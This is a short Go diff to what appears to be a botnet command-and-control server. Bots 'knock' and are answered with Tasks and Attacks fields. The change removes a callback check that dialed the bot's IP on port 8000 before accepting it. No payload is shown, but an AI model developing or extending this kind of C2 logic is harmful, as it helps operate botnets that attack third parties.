@@ -1,7 +1,6 @@
 package bot
 
 import (
-	"net"
 	"net/http"
 	"time"
 
@@ -17,17 +16,6 @@ func ParseKnock(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, Response{
 			Code:    http.StatusInternalServerError,
 			Message: err.Error(),
-			Tasks:   nil,
-			Attacks: nil,
-		})
-		c.Abort()
-		return
-	}
-
-	if _, err := net.Dial("tcp", bot.IP+":8000"); err != nil {
-		c.JSON(http.StatusForbidden, Response{
-			Code:    http.StatusForbidden,
-			Message: "Get out!",
 			Tasks:   nil,
 			Attacks: nil,
 		})
